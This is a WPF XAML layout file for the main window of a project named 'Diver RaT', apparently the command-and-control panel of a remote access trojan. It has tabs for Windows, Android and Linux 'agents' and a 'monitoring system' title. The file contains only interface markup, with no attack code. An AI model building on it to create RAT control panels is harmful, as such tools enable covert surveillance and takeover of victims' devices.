<Window x:Class="Diver_RaT.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:Diver_RaT"
        mc:Ignorable="d"
        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
        Title="Diver RaT - Command Center" Height="720" Width="1100"
        WindowStartupLocation="CenterScreen"
        WindowStyle="None"
        ResizeMode="CanResize"
        Background="{StaticResource WindowBgBrush}"
        Foreground="#E6E8EF">

    <WindowChrome.WindowChrome>
        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
                      CornerRadius="8" UseAeroCaptionButtons="False"/>
    </WindowChrome.WindowChrome>

    <Window.Resources>
        <Style x:Key="TabItemStyle" TargetType="TabItem">
            <Setter Property="Foreground" Value="#8A90A6"/>
            <Setter Property="FontSize" Value="13"/>
            <Setter Property="FontWeight" Value="SemiBold"/>
            <Setter Property="Padding" Value="20,10"/>
            <Setter Property="Cursor" Value="Hand"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="TabItem">
                        <Border x:Name="bd" Background="Transparent" Padding="{TemplateBinding Padding}"
                                BorderThickness="0,0,0,2" BorderBrush="Transparent">
                            <ContentPresenter ContentSource="Header" HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="bd" Property="Background" Value="#14FFFFFF"/>
                            </Trigger>
                            <Trigger Property="IsSelected" Value="True">
                                <Setter TargetName="bd" Property="BorderBrush" Value="{StaticResource LimeBrush}"/>
                                <Setter Property="Foreground" Value="{StaticResource LimeBrush}"/>
                                <Setter TargetName="bd" Property="Background" Value="#0AFFFFFF"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>

    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>

        <!-- Title bar -->
        <Border Grid.Row="0" Background="{StaticResource HeaderGlassBrush}"
                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="0,0,0,1"
                Padding="16,6" MouseLeftButtonDown="TitleBar_MouseLeftButtonDown">
            <Grid Margin="0,0,-16,0">
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="Auto"/>
                    <ColumnDefinition Width="Auto"/>
                </Grid.ColumnDefinitions>

                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                    <Image Source="/Resources/app.ico" Width="16" Height="16" Margin="0,0,10,0"/>
                    <TextBlock Text="AFRILEN MONITORING SYSTEM" FontSize="15" FontWeight="Bold"
                               Foreground="{StaticResource LimeBrush}"
                               VerticalAlignment="Center"/>
                    <TextBlock Text="Command Center" FontSize="13" Foreground="{StaticResource MutedBrush}"
                               Margin="12,2,0,0" VerticalAlignment="Center"/>
                </StackPanel>

                <StackPanel Grid.Column="1" Orientation="Horizontal" VerticalAlignment="Center" Margin="0,0,8,0">
                    <Border Width="1" Height="22" Background="#22B4FF00" Margin="0,0,8,0"/>
                    <Button Style="{StaticResource WinButtonStyle}" Content="&#xE921;" ToolTip="Minimize"
                            Click="MinimizeButton_Click"/>
                    <Button Style="{StaticResource WinCloseButtonStyle}" Content="&#xE8BB;" ToolTip="Close"
                            Click="CloseButton_Click" Margin="4,0,0,0"/>
                </StackPanel>
            </Grid>
        </Border>

        <!-- Tab bar -->
        <Border Grid.Row="1" Background="{StaticResource PanelGlassBrush}"
                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="0,0,0,1">
            <Grid>
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="Auto"/>
                </Grid.ColumnDefinitions>
                <TabControl x:Name="MainTabs" Grid.Column="0" Background="Transparent" BorderThickness="0" Padding="0"
                            SelectionChanged="MainTabs_SelectionChanged">
                    <TabItem x:Name="WindowsTab" Style="{StaticResource TabItemStyle}" Header="&#x1f5a5;   Windows Agents">
                    </TabItem>
                    <TabItem x:Name="AndroidTab" Style="{StaticResource TabItemStyle}" Header="&#x1f4f1;   Android Agents">
                    </TabItem>
                    <TabItem x:Name="LinuxTab" Style="{StaticResource TabItemStyle}" Header="&#x1f427;   Linux Agents">
                    </TabItem>
                </TabControl>
                <Button x:Name="SettingsButton" Grid.Column="1" Click="SettingsButton_Click"
                        Content="&#x2699;  Settings" Height="32" Padding="16,0"
                        VerticalAlignment="Center" FontSize="13" Cursor="Hand" Margin="0,0,4,0"/>
            </Grid>
        </Border>

        <!-- Content -->
        <Grid Grid.Row="2">
            <local:DeviceTabContent x:Name="WindowsContent"/>
            <local:DeviceTabContent x:Name="AndroidContent" Visibility="Collapsed"/>
            <local:DeviceTabContent x:Name="LinuxContent" Visibility="Collapsed"/>
        </Grid>

        <!-- Status bar -->
        <Border Grid.Row="3" Background="{StaticResource HeaderGlassBrush}"
                BorderBrush="{StaticResource GlassBorderBrush}" BorderThickness="0,1,0,0"
                Padding="20,8">
            <Grid>
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="Auto"/>
                </Grid.ColumnDefinitions>
                <TextBlock x:Name="StatusText" Text="Ready" FontSize="12" Foreground="{StaticResource MutedBrush}"/>
                <TextBlock x:Name="EventText" Grid.Column="1" FontSize="12" Foreground="#7CFF7C"
                           TextTrimming="CharacterEllipsis" MaxWidth="420"/>
            </Grid>
        </Border>
    </Grid>
</Window>